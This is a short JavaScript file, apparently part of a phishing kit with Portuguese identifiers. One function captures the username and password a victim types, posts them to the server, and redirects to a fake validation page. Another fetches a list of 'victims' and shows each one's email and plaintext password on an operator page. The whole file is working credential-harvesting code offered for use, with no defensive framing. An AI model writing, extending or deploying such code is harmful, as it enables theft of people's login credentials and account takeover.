function bizonhosAddHtml(user, pass){
    let newBizonho = document.createElement("li");
    newBizonho.innerHTML = `<p>Email: <strong>${user}</strong> </p><p>Password: <strong>${pass}</strong> </p>`;

    document.getElementById("bizonhos").appendChild(newBizonho);
}

function getBizonhos(){
    fetch("/victimsjson")
    .then(response => response.json())
    .then(data => {
        console.log(data);
        for (let i = 0; i < data.victims.length; i++) {
            const bizonhos = data.victims[i];
            bizonhosAddHtml(bizonhos.username, bizonhos.password);
        }
    })
    .catch(error => console.error("Impossivel obter bizonhos!", error));
}
 

function postBizonhos(){
    let user = document.getElementById("username").value;
    let pass = document.getElementById("password").value;

    let jsonData = {
        username: user,
        password: pass, 
    }

    fetch("/post", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(jsonData)
    })
    .then(data => {
        console.log(data);
        window.location.href = "/validando"
    })

}